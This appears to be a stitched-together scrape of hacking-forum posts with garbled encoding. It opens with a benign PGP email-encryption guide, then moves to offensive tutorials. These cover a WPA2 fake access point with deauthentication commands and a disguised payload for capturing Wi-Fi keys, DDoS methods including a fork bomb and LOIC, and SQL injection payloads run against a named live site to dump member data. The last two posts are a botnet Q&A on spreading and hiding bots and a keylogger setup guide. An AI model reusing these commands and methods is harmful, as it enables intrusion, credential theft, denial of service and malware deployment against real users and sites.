will need to find and download the equivalent  package for your Operating System). For Windows  Hidden Content:  You must reply to see links offers a great bundle which comes with  Kleopatra   and of course the GnuPG libraries to use PGP encryption. It is 100%  free but of course you could donate to support this software.     Hidden Content:  You must reply to see links  When downloaded, run the setup. No extra configuration is needed. Simply follow the steps (see below).   Hidden Content:  You must reply to see links   Hidden Content:  You must reply to see links     Hidden Content:  You must reply to see links When correctly installed, it should offer you to run the  Kleopatra  software. This software will generate a new certificate and manage certificate graphically in a very user friendly manner.  [h=3]Create a new Certificate[/h] Run Kleopatra if you havenÃ¢â¬â¢t done so already. Then click on  File  >  New Certificate.   Hidden Content:  You must reply to see links  Choose Ã¢â¬Å Create a personal OpenPGP key pair Ã¢â¬Â   Hidden Content:  You must reply to see links  With the next step you must enter some information about yourself.

Hidden Content:  You must reply to see links  Congratulations, you just create your very first certificate! Now you  can choose to backup your key pair (Key pair are composed of the Public  and Private key) or export them later from  Kleopatra  interface. It is recommended to backup your keys in a safe location. Your Private  key should never be released to public, because that could compromise  your security and privacy. Store it on an USB key and keep this USB  securely hidden.  Reminder :   The public key is the key you must share with the people you  need to contact securely via mail. This key will be used to each of your  correspondents to send you encrypted mails. To be able to respond to those mails in a secure way to you  also need the public key of your correspondent to send them encrypted  mails using their public key. We called that Public Key Exchange. The private key is the key you need to decrypt arrival messages, you must not share or lose this key.  The public key content looks like that :   -----BEGIN PGP PUBLIC KEY BLOCK----- Version: GnuPG v2.0.21 (MingW32)  mQINBFJMBu0BEAC9fW32VC2QAMPd8rGtaYvbwJmFNe0BImsZvDhnb8Wg/qEUwTT5

Each time you add a Private/Public key you should see this kind of Message Box.   Hidden Content:  You must reply to see links  This means everything went well during importation. When you have imported all needed keys you are now ready to use PGP mail encryption !   Sending a mail using PGP Encryption  In this example I will send an email from my test account Ã¢â¬Å [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ Ã¢â¬Â to my fake partner Ã¢â¬Å [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ Ã¢â¬Å. Of course to achieve this I successfully imported the Private and Public key of Ã¢â¬Å [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ Ã¢â¬Â account and imported the Public key of Ã¢â¬Å [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ Ã¢â¬Â to send encrypted mails.

Hidden Content:  You must reply to see links  Note that PGP doesnÃ¢â¬â¢t support the message containing HTML, when using  PGP to send encrypted mail you should avoid composing message using  HTML, the following alert should appear then but might not prevent mail  sending.   Hidden Content:  You must reply to see links  Click OK if this message appears then enter your Pass-Phrase (the  Pass-Phrase if the password you choose during Certificate Creation  Wizard), without this password you canÃ¢â¬â¢t encrypt/read encrypted mails  which use your Private key (this is the symmetric encryption  protection).   Hidden Content:  You must reply to see links If  pass-phrase correct the mail should start doing submission process (in  the bellow image we can see our message encrypted before sending).   Hidden Content:  You must reply to see links  Now we will read our fresh encrypted mail on our second test inbox Ã¢â¬Å [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ Ã¢â¬Â  Just click on the mail you want to read, it should offer to enter  your pass-phrase (like when sending an encrypted mail but this time to  read the mail).   Hidden Content:  You must reply to see links  If pass-phrase was successfully entered, you should be able to read the mail content. Hidden Content:  You must reply to see links  [h=3]Conclusion[/h]    You are now able to use PGP encryption to secure your mails between  you and your colleges / friends or random people on the Internet which  would like to contact you in a secure way. This method is commonly used by the army and government intelligence  services for its robustness and simplicity. If correctly configured you  can sleep a sound sleep!  Just some final notes   GPG4Win offers you an easy way to encrypt/decrypt files using your certificate. When you delete confidential files from your computer (when you  decrypt them for example) use a file shredder to avoid file recovery by  analyzing hard drives. Enigmail offers you to encrypt file attachment when sending an encrypted mail, always accept attachment encryption. Never share your Private keys, only Public keys must be offered to your contacts. Keep a backup of your Private and Public keys in a secure location. Be aware of the laws of your country regarding encryption standards.

0	[TUT] WPA2 -- Ultimate Fake AP	""" This is my new spin on an old idea.  This will show you how to get WPA2  passwords using a Fake AP without having to ask the user for them.   Users will not have to enter a password into a webpage. I will show how to set up the Fake AP but that is not my main goal.  I  will cover stuff many of you already know, but stay kind to the noobs.   Hopefully everyone will take something from this.  The secret sauce of  this tutorial is what happens after the client connects to your Fake AP.   Are you ready? :P Ultimate Fake AP [video=youtube;sFxV9obM0GI]http://www.youtube.com/watch?v=sFxV9obM0GI&amp;feature=player_embedded[/video] Overview We will be using: Backtrack 5r3  airbase-ng  dhcpd3-server  apache2  ettercap  nano (or another text editor)  grep    Step 1:  Airbase-ng A.    Get into backtrack and start monitor mode on your device.  Be sure to  specify the channel of your target -- (11 in this example).   Code: airmon-ng start wlan0 11    airodump-ng --channel 11 mon0   B.    Now that you have monitor mode I will assume mon0 is your monitor  interface name.  Start airbase-ng.  This cannot be encrypted.  DO-NOT  change the aa.aa..etc to the MAC address of your target access point,  but   DO  write down the target AP MAC and target client MAC for step 7 later --  (these are found with airodump-ng which is beyond the scope of this  tutorial .  DO change the --essid to the SSID of your  target.  Do change your -c (channel) to match their channel.  Discussion  about this is welcome.   Code: airbase-ng -a aa:aa:aa:aa:aa:aa --essid MYaccessPoint -c 11 mon0   C.   Bring up the airbase-ng at0 interface.   Code: ifconfig at0 up   D.   Give at0 this specific IP address.   Code: ifconfig at0 192.168.0.1   Step 2:  Configure and Start dhcp3 **UPDATE How to install DHCP3 on BT5r3 -->     Code: Code: apt-get synaptic   Code: synaptic   search for dhcp3-common select it Go to packages at top menu bar Force version 3.1.3-2Ubuntu3.2 Force version mark apply apply search dhcp3-server right click and mark for installation apply apply search dhcp3-client right click and mark for installation apply apply search python-wicd right click and mark for  REMOVAL apply apply search for wicd right click and mark for installation mark apply apply   A.   Edit the dhcpd.conf file so your dhcpd3 server can hand out IP addresses to connecting clients.   Code: nano /etc/dhcp3/dhcpd.conf   B.   Once the dhcpd.conf file is open, erase everything in it.  Then put this in.   Code: option domain-name-servers 192.168.0.1; default-lease-time 600; max-lease-time 7200; authoritative; subnet 192.168.0.0 netmask 255.255.255.0 {   range 192.168.0.10 192.168.0.20;   option routers 192.168.0.1;   } C.   Create a symbolic link to overcome a common problem with dhcpd3 -- \""Cant create PID file /var/run/dhcpd.pid:\""   Code: ln -s /var/run/dhcp3-server/dhcpd.pid /var/run/dhcpd.pid   D.   Start the dhcpd3 server on the at0 interface using the config file you edited above    Code: dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0   Step 3:  Configure apache2 webserver A.    Edit a config file to configure rewrite functionality.  This will  redirect almost any URL including sub directories back to our Fake AP  page.   Code: nano /etc/apache2/sites-enabled/000-default   B.    Once the 000-default file is open make this section look like this.   Take note we are adding a directory called /Fixit as an exception.  It  is case sensitive.  We will add this directory in part 2.  Dont type  add!    Code: <Directory /var/www/>         Options Indexes FollowSymLinks MultiViews         AllowOverride None         Order allow,deny         allow from all    Add-->  RewriteCond  %{REQUEST_URI}  !^/Fixit    Add-->    RewriteEngine On    Add-->    RewriteRule ^.*$ /Fixit/     </Directory> C.   Start the rewrite mod. Code: a2enmod rewrite   D.   You must restart apache2 to update the config.   Code: /etc/init.d/apache2 restart   Step 4:  Ettercap A.   Edit etter.dns config file to send all client web traffic to our apache2 webserver.   Code: nano /usr/local/share/ettercap/etter.dns   B.   Once the etter.dns file is open erase everything and put this in.   Code: * A 192.168.0.1 C.    Start ettercap in DNS spoof mode and pipe it through grep.  The regex  will parse our incoming secret sauce for up to 20 character SSID/names,   AP authentication type, and 8-64 character wlan keys. Code: ettercap -T -i at0 -P dns_spoof | grep -E -o \""<name>.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?</name>\""\\|\""<keyMaterial>..?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?​.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?</keyMaterial>\""\\|\""<authentication>.?.?.?.?.?.?.?.?.?.?.?</authentication>\"" Take a break   Step 5:  Wrapping UP A.   Make a direcotry called \""Fixit\"" in /var/www/ it is case sensitive!   Code: mkdir /var/www/Fixit   Step 6:  Secret Sauce Part 1 The Fixit directory will contain your html and files for apache2.  In my  video I use a custom edited microsoft \""Fixit\"" page.  I removed all  java, and changed a download link and some text.  The html and image  files for the page are in Secret Sauce Part 2 for download.  My  index.html download link points to my custom file \""bla.bat\"".  Bla.bat is  not overly complicated but it is my work. This will not trip antivirus  or be affected by any firewall.  If the web browser works this will  work.    If you share this simple code, dont forget where it came from.

There is no virus but dont take my word for it.   This is whats included: [url=\""http://i.imgur.com/neixTKE.jpg\""] [/url] [url=\""http://i.imgur.com/7PwADm3.jpg\""] [/url] Step 7:  Last Step -- Making the Clients Connect A.    Get your target MAC addresses ready as directed in step 1B.  We will  use the MACs to deauthenticate the users from their actuall access  points -- so that they will connect to ours.  There are other ways to do  this, but it is beyond the scope yada yada yada.    Code: aireplay-ng --deauth 5000 -c TARGETCLIENTMAC -a TARGETAPMAC mon0   B.    Start the above command when it stops.  The 5000 means send 5000  deauthentication packets.  If 5000 is enough to make them connect to our  Fake AP then you can stop the command.  If they do not connect, just  keep hammering them until they do.

0	[TUT]DDoS Attack - A life lesson	""" Introduction I know their are a lot more ways to DoS than are shown here, but ill  let you figure them out yourself. If you find any mistake in this  tutorial please tell me^^ What is \""DDoS\""? Hidden Content:  You must reply to see links (or  Distributed Denial of Service attacks[DDoS]) are a form of organized  attacks with the goal of taking down a server by overloading it. Often  by sending useless information(packets) to a server in massive amounts. In-fact about a year ago I found one of my websites was accidentally  DoS-ing darksunlight.com(I use darksunlight as my webhost) because my  PHP script made an infinite loop that sent the same information over and  over and over into darksunlights SQL databases. This one page took  this EXTREMELY powerful server down twice in less than a minute. That  site has since been deleted.  That story demonstrates that it does not take more than a simple \""error\"" in your code to overload a server. Keep in mind that altough spreading knowledge is my main goal, performing DDoS attacks is indeed a federal crime in the US.  It is also an international offence and will be punished according to the local laws of the individuals country. But enough talk. I will now show you a quick example of a DoS attack of sorts you can do on your local computer. Sample Keep in mind that this is  NOT  a real DoS attack, but rather an example to  visualize  how a DoS attack works. We will take down YOUR computer.  Step 1 Open up notepad, mousepad, or your favored equivalent. Step 2 Type in this simple batch command Code: :a start goto a Step 3 Save as \""dossample.bat\"" making sure you select \""All files\"" from the \""File Type\"" dialog. Step 4 Run that sucker, but save your work first, as this will crash even the best computers in a matter of minutes.   What did you learn from this? Observe how the file rapidly replicates itself, opening a new CMD right after it opens another. An infinite loop has been created that has filled the RAM with useless  and massive amounts of CMDs(or Terminals for you Unix folk) DDoS attacks work much the same way, except instead of replicating an  infinite number of CMDs, they send information(packets) to the server  over and over and over again until the server crashes. What information you may ask? Anything. Your login name, your online status, a new comment, the  number of views on a video, your new high score. Absolutely any  information that could be resent a massive amount of times to the same  server. Next we will be discussing the simplest form of DDoS. DDoS by Ping Flood Please note that I will be pinging my Localhost.  You should too.  Perhaps one of the simplest ways to DoS is by using the ping command  built into most operating systems, including all windows and Linux  distributions. Step 1 Start up your server. Mine is apache, but that is beside the point, the  server type does not matter. If it has an IP address, it can be pinged. Step 2 Type in the ping command Code: ping -t -a -l 65500 localhost Step 3 Press enter and watch it ping the localhost over and over until[/b] your server crashes, or you get tired of waiting for it to crash.  Since most modern servers can take the stress of the ping flood, you  will need to get all your friends to help you ping to bring your server  down. Or even slow it down. Command Explained ping  - tells the computer to ping a server -t  - It will continue to ping the server until the command is closed, or stopped. -a  - Resolves the address to host names. -l  - Size. By default the ping will send 32bytes of data to the server, so you must  change this to a bigger number. The maximum is 65,500bytes, so that is  what we used. If you send a server any number higher than 65,500bytes it will instantly crash. This is called \""Ping of Death\"".  Like any other thing with the suffix \""of Death\"" it is very rare, and hard to accomplish indeed. DDoS by Reloading Something as simple as reloading a page can take down a server if done enough times. Step 1 Make a page that lets you submit forms. Method=GET is better than method=POST for this, but both will work. (If you do not understand step 1, just find a page that lets you submit information, like a new comment or upload a picture) Step 2 Fill out the forms and submit Step 3 Reload the page If the page uses the POST method your browser will display a dialog  asking if you are sure you want to resend the information, or something  to that effect. Simply click \""Continue\"" or \""OK\"".(see now why GET is  better?) Step 4 Keep reloading until server is down.  Their are many add ons and tools that allow you to auto-reload a page.  It is a matter of googleing for them. They are widely available and  free.  I have just created a program that allows you to Auto-refresh a page using IE. If you are interested please download from: Hidden Content:  You must reply to see links This method is very primitive as you can see, but it is probably the best way to DDoS.  Low-Orbit Ion Cannon LOIC (Low Orbit Ion Cannon) is an app, written in C# and developed by  praetox, that was used by Anonymous during Project Chanology. It  attempts to DoS the target site by using all its bandwidth, sending TCP,  UDP, or HTTP requests to the server until it crashes. Download: Hidden Content:  You must reply to see links Step 1 Download and extract LOIC Step 2 Open LOIC.exe and fill out the required information. Instructions for filling out: IP or URL  = IP or URL that you wish to DoS TCP / UDP message  = information being sent, just write something random. Or leave it as default. Port  = Servers port Method  = Servers Method, leave as TCP if unknown If you are gonna try to take down a website then use HTTP Speed  = set to \""<= faster\"" Threads  = How many users it  should simulate, the higher the number the faster it will crash. Set to  10,000. Note that this might make your computer lag, if so, set to a  lower amount. Step 3 Click on \""IMMA CHARGIN MAH LAZER\"" This starts your the program.   Warning: This tool might not seem like  much, but many people of all ages have been arrested and convicted for  knowingly using this tool. Remember DoS and DDoS are federal crimes,  however insignificant it may seem. Use at your own discretion.  Conclusion Now you know what a DDoS attack is and you can work to better protect your self. Their are still many other ways to attack a server, but these are the basics of DoS. Protect your servers xD Like any web developer I hope you will use this information for the good.  Sadly i know that their are those among us that are, even now as we read this, plotting how to do harm with this information.  To those, I flip the bird. You may use this tutorial, in part or as a whole, for whatever purpose. -Druidtton of Darksunlight. """

(which is no doubt a very good tool) and i used to think, why dont people  use these tools, why they prefer manual Injection. Well .. the answer is  simple . Lots of things you can do manually can never be done by these tools. Now I only use them when Im doing  Blind Injection . So, I have decided to write a  series of tutorials on SQL Injection  from  Medium to Advanced Level . Theres nothing new from my side in these tutorials except  the explanation (The Best i can do). Im just posting what i have learnt. These threads/articles will be my creation.  Not the methods but the threads .  I have already posted a  Basic Tutorial  .. Check it here if you havent checked it yet. Hidden Content:  You must reply to see links So, In this first part Im going to  show you guys : 1)  How to Bypass  1024  character Limit of  group_concat() . 2)  How to  Dump  a complete table using  single query . 1)  How to Bypass  1024  character Limit of  group_concat() : Some functions in  MySQL  are limited to a character length of  1024  characters. Now, this limit can be increased only if youre a MySQL  Root  User. But, in our case we do not have the permissions to change these limits. One of the very handy functions we use in our SQL Injection query is  group_concat() . This  function returns a string with concatenated non-NULL values from a group  and by default it is also limited to a character length of  1024 . To demonstrate this whole scenario, Ive chosen few  targets . For this Example the target Im going to use is: hxxp://www.padaweb.org/about.php?cid=2 Here the parameter  cid  is vulnerable to very simple SQL Injection. By quickly evaluating the vulnerable columns, this is the query. hxxp://www.padaweb.org/about.php?cid=2 +and+0+Union+select+1,2,3,4-- The vulnerable columns are  1  and  2 . Column  1  is in the title of the webpage, where as column  2  is on the webpage. Now i can Inject in Column  2 . But just for the sake of fun, I will inject in Column  1 . But first i will use my previous tutorial called Hidden Content:  You must reply to see links   to bring that column 1 from the title  of the webpage to the main webpage.  So, by looking at the  source : I know to bring this column on the webpage i have to close  <title>  tag as  </title> . But as  Magic Quotes  are  ON  so i have to convert my  HTML  tag to  HEX  first. My query will be: hxxp://www.padaweb.org/about.php?cid=2 +and+0+Union+select+concat(</title>,database()),2,3,4-- [b]After converting  </title>  to  HEX : hxxp://www.padaweb.org/about.php?cid=2 +and+0+Union+select+concat(0x3c2f7469746c653e,database()),2,3,4-- And see the  result  now: Now if you want to add some colors and stuff follow my  previous tutorial . Coming to the actual goal again, by quickly evaluating all the tables i have found an interesting table  here :   tblMember  in the main database :   padaorg_pada Lets get the  column names  of this table. The query will be: Before Converting to HEX: hxxp://www.padaweb.org/about.php?cid=2 +and+0+Union+select+concat(</title>,group_concat(<br>,column_name)),2,3,4+from+information_schema.columns+where+table_n ame=tblMember-- I have to convert the  HTML  tags in  HEX  and  tblMember  to  CHAR()  as  Magic Quotes  are  ON . so after converting: hxxp://www.padaweb.org/about.php?cid=2 +and+0+Union+select+concat(0x3c2f7469746c653e,group_concat(0x3c62723e,column_nam​e)),2,3,4+from+information_schema.colum ns+where+table_name=CHAR(116, 98, 108, 77, 101, 109, 98, 101, 114)-- Now, by looking at all the  column names  some one may think that these are all the  column names ,  but no , we have more, we couldnt dump them because of the   1024  character limit. By Using this  query  i can find no. of Columns in  tblMember : hxxp://www.padaweb.org/about.php?cid=2 +and+0+Union+select+concat(0x3c2f7469746c653e,count(column_name)),2,3,4+from+inf​ormation_schema.columns+where+table_nam e=CHAR(116, 98, 108, 77, 101, 109, 98, 101, 114)-- That is :  35  Rows of Data so we are  missing  some columns here. Lets do one more test. Lets grab the data in some of the columns.  This  query  will tell me, how many Entries or Rows are there in this table: hxxp://www.padaweb.org/about.php?cid=2 +and+0+Union+select+concat(0x3c2f7469746c653e,count(*)),2,3,4+from+tblMember-- That is:  45  Rows of Data Lets see how many do we get using  group_concat() : hxxp://www.padaweb.org/about.php?cid=2 +and+0+Union+select+concat(0x3c2f7469746c653e,group_concat(0x3c62723e,Member_Nam​e,0x3a,Date_Time_Created,0x3a,Date_Time _Modified)),2,3,4+from+tblMember-- That is:  18  Rows of Data So, we are  definitely missing  some data here and you know the reason. To  bypass  this we are going to use  simple programming logic  i.e  Iterations . Take a look at this code: PHP Code: (   select  (@ x )    from  (   select  (@ x := 0x00 ),              (   select  ( 0 )    from  ( information_schema . columns )    where  ( table_schema != information_schema ) and ( 0x00 )    in  (@ x := concat (@ x , <br> , table_schema , --> , table_name , --> , column_name ))  )  ) x )    Yea .. i know it looks  horrible  ..   .. but dont worry .. this piece of code will do wonders for us. Let me explain whats happening here. Warning :  IF you have a Weak Heart, Leave this thread at this very moment  So, we are declaring a variable  x  here and with the help of nested  SELECT  statement we will iterate through each and every  Table Name  and  Column name  of  all the databases available except for  information_schema  which is not required as it just gives access to the  MetaData  of the databases and thus all the  Column names will be printed with their respective Table names . I will put this whole code in my  SQL Injection query  in my vulnerable Column i.e column  1 . Lets try this. My  Query  will become: hxxp://www.padaweb.org/about.php?cid= 2+and+0+Union+select+concat(0x3c2f7469746c653e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.columns)  where (table_schema!=information_schema) and (0x00) in  (@x:=concat(@x,<br>,table_schema,-->,table_name,-->,column_name))))x)),2,3,4-- But this will  NOT  work ..   why? because  magic quotes are ON . we have to do some  Hexing  here. So after  Hexing : hxxp://www.padaweb.org/about.php?cid=2 +and+0+Union+select+concat(0x3c2f7469746c653e,(select (@x) from (select (@x:=0x00), (select (0) from   (information_schema.columns) where  (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in  (@x:=concat(@x,0x3c62723e,table_schema,0x2d2d3e,table_name,0x2d2d3e,column_name) ​)))x)),2,3,4-- Lets add some  Colors  to it   (Be Nice Plz, I know This  Query  will be  HUGE ) : hxxp://www.padaweb.org/about.php?cid=2 +and+0+Union+select+concat(0x3c2f7469746c653e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.columns)  where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00)  in  (@x:=concat(@x,0x3c62723e,0x3c666f6e742073697a653d22352220636f6c6f723d2272656422 ​ 3e,table_schema,0x3c2f666f6e743e,0x2d2d3e,0x3c666f6e742073697a653d22342220636f6c ​ 6f723d22677265656e223e,table_name,0x3c2f666f6e743e,0x2d2d3e3c666f6e7420636f6c6f7 ​23d22626c7565223e,column_name))))x)),2,3,4-- Check the result (  SWEET   ) : 2)  How to Dump a complete  table  in one go. So, after  all this, there must be a way to dump a whole table (Data in all  Columns) with one Single Query. We are going to use a similar code again  but with  little  modification . PHP Code: (   select  (@)    from  (   select  (@:= 0x00 ),             (   select  (@)    from TABLE_NAME_HERE   where  (@)  in  (@:= concat (@, <br> , FIRST_COLUMN_HERE , --> , SECOND_COLUMN_HERE , --> , AND_SO_ON ))            )        ) a )    Lets try this. By using this whole code in our  Query : hxxp://www.padaweb.org/about.php?cid=2 +and+0+Union+select+concat(0x3c2f7469746c653e,(select (@) from (select (@:=0x00), (select (@) from tblMember where (@)   in  (@:=concat(@,0x3c62723e,0x3c666f6e742073697a653d22352220636f6c6f723d22726564223e ​ ,Member_Name,0x3c2f666f6e743e,0x2d2d3e,0x3c666f6e742073697a653d22342220636f6c6f7 ​ 23d22677265656e223e,Date_Time_Created,0x3c2f666f6e743e,0x2d2d3e,0x3c666f6e742063 ​ 6f6c6f723d22626c7565223e,Date_Time_Modified,0x3c2f666f6e743e))))a)),2,3,4-- That is :  45   ( Which was previously  18  using  group_concat ) Thats it for the day..

0	Botnet Q&amp;A !	""" Just something I compiled quickly. Im also posting my bot setup guide soon. If you want any questions or links added to the Q&A, please ask and Ill add them. Q:  Whats a bot? A:  A bot is a malicious program which has several purposes.  They are usually told what to do by a botnet admin although many of the features now are automated. Q:  Whats a botnet? A:  A botnet is a network of infected computers that all connect to one area where they are commanded by the botnet admin. Q:  What can a bot do? A:  Usual features of a bot include... P2P Spreading (Limewire, uTorrent, etc.) IM Spreading (Sends to contacts on MSN, AIM, etc.) DDoS attacking (See \""whats a DDoS attack?\"") Spam mailing to lists of emails (Often used to spread) Collecting personal information (Passwords, bank details and the like)   Q:  How are bots told what to do? A:  Bots are usually commanded through an IRC channel by the user. Commands are built in and the bots listen for them. Q:  Whats an IRC channel? A:   IRC stands for Internet Relay  Chat. Its like a group messaging thing  although you can also speak to  people privately. To use IRC you need a  client like ChatZilla, XChat or  mIRC. You then connect to an IRC server  and choose the channel you  wish to join. Q:  How do I get a botnet? A:   First you will need a source  code and the programs required to compile  it. Most bots are programmed  in C++, but you dont need any programming  experience to compile your  own. There is usually one file named  \""Configs.h\"" or something similar  that you have to edit, thats where you  edit the bot names, the IRC  channel and any other necessary  information. Look for bot sources in  the botnet section here and theyll  usually come with some form of  instructions. Q:  Which bot should I use? A:  I recommend IMBot v4.1, its pretty simple to compile and use, Im sure there are tutorials here for it as well. You can download IMBot  Hidden Content:  You must reply to see links  (Clean download, its mine). Q:  Is this illegal? A:   Yes. Mass-spreading a bot  illegally and stealing information can get  you into real trouble if  youre caught. 99% of the botnets that are shut  down have over 10,000  bots, though, and I wouldnt expect anyone here  to reach over 5,000.  You will have to make sure your IRC server is  secure and that your bot  stays undetected. Q:  Is it true I can make money from this? A:   Yes, potentially. You could make  the bots visit referral sites or  download files. A lot of people sell  the accounts theyve taken from  their bots for a price cheaper than the  original. You dont have to do  any of this, but as your botnet grows  you will need more money to  transfer to a professional IRC host. Q:  How can I secure/hide my botnet? A:   Offshore hosting first of all.  Something in a country such as Sweden,  for example. Dedicated hosting  would be best, because that way you  arent sharing your hosted server  with anyone and you can hold a much  larger network. A password on your  IRC channel is also recommended. Be  sure to use a bot that is  undetected, whether you have to crypt it or  not. Q:  What do most people use botnets for? A:   The majority of them are used  for DDoS attacks against websites when  there are a lot of them. Many  people set up large botnets just to sell  their bots, though. With the  rate they spread at, you could sell a large  amount of bots to someone  for a nice profit with only a small amount of  work done. Q:  How can I spread my bot? A:   Most bots are spread through  torrenting websites or warez boards. A lot  of bots also have  auto-spread features, so you could have 50 bots and  then gain 150 more  through the auto-spreading without doing any work at  all. A lot of  people also buy bots off other botnet admins to start  their botnet off  with a nice amount. Q:  What type of bot would be best? A:   Java bots seem to be the most  popular right now since a lot of them are  still fully undetectable, but  you have to bear in mind that your slave  will need Java. The same with  bots coded in VB.NET, your bots will need  the .NET framework. Some VB6  bots may also need missing .ocx files, so  in my opinion the best  choice of bot would be one coded in C++ such as  IMBot. Q:  How much should I pay for bot installs? A:   A good price would be 10 cents  per bot, which works out at $10 for 100.  Some botnet admins may charge  you more, but I dont think its worth  paying much more than that.  Another risk of buying from other botnet  owners is that they still keep  the bots to themselves as well, so be  sure to find someone  trustworthy. Bear in mind that some may not be able  to remove their  own. Q:  How do I configure my bot to connect to my IRC server? A:  Most bots come with some sort of instructions text file. There are also a lot of tutorials for different bots here at HF, just  Hidden Content:  You must reply to see links    the name of your bot. If you cant find anything, there is usually a   file named \""config.h\"" (C++) or something similar. Open that and edit the   parts that youre supposed to, it should be clear which parts to   change. Example:  //\""server\"",\""pass\"",6667,\""channel\"",\""channelpass\"",\""-ix\"";  needs to be your info in that order. Q:  Is it easy to set everything up? A:   It is usually easy to configure  and compile a bot, but setting up your  IRC server, keeping it secure,  paying for larger off-shore hosts,  managing your bots and staying  hidden are not easy tasks for beginners.  Once youve done it all  several times it will be easier though, as with  anything. There are  usually people here who would be able to help you  out if youre having  any problems with your bots. Q:  Can I have a botnet without an IRC? A:   Yes. There are other great bots.  Some can connect to PHP pages to read  commands, some can be commanded  over MSN and other clients, and some  come with their own clients.. """

0	[NEW][TUT] Project Neptune (BEST KeyLogger) - COMPLETE Setup Tutorial [NEW][TUT]	"""   Hello!  First off, Id like to let you know that all credits for the actual keylogger goes to Thyonic.   I posted the keylogger a while ago and it quickly became the most  popular keylogger on iHack Forums within a month.  Its still in  development to this day, and it will automatically update on start up if  there is an update available. Note: Most of these images are out of date.  Ill get around to updating them some time soon.  Thanks! Now that thats out of the way, to the tutorial! Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links    - Download Information -  Download link:  Hidden Content:  You must reply to see links What exactly makes this keylogger so special? Simply put, it is one of the most stable, well put together, and all  around well written loggers around.  It pays attention to the minor  details and offers plenty of features.     - Tutorial -   Step One - Downloading First off, make sure you go to the link above to download it.  You will need  Hidden Content:  You must reply to see links  to extract it. After you have downloaded Project Neptune, simply drag and drop the folder containing all the files to your desktop, like shown:   ---   Step Two - Setting Up Log Storing First off, you have to decide what you want to use to store logs.  For  email, I recommend using Gmail, and you can make an account for that  here:   Hidden Content:  You must reply to see links This tutorial will be using Email, specifically Gmail, but if you want  to use FTP, using DriveHQ, its free and allows a lot of storage:  Hidden Content:  You must reply to see links After you are done making your Gmail account, take a look at the picture below: --- Step Three - Setting Up System Settings There isnt much to do on this tab, but Ill give a small explanation on what it all does: Number 1 - These options simply disable taskmanagers ability to end  your servers process.  If you activate any, choose the last one, it has  the smallest suspicion level! Number 2 - This is for blocking websites, but be weary, because it  requires admin rights and will crash if it doesnt have it.  Right click  on the box to add sites. Number 3 - All of these options are self explanatory, but be warned:  they require admin rights and will cause the server to crash if the  client doesnt have admin rights.  Mouse over them for more information. --- Step Four - Installation Settings This tab is for setting up how your keylogger gets installed on your  client.  You need to melt your file so that it wont get tampered with  after it is ran.  This is just a safety feature if youll be infecting  intelligent people, but I always use it! --- Step Five - Extra Options These are all of those extra options that just make it more exciting.   Use the Fake Error Message if you dont want to bind it to  something/crypt it. --- Step Six - Server Generation This is the last step! Click on the \""Server Generation\"" tab and go ahead and copy down the  Uninstall password - youll need this if you ever test PN out on your  computer.  After that, go ahead and hit \""Generate New Server\"" and youre  set to go! Now that you are done, your server file should be generated if  everything went ok.  If you have any questions, feel free to ask.   Protip:  Click on the next tab and hit \""Save Settings\"" so that you dont have to enter all of this every time you use it!   """
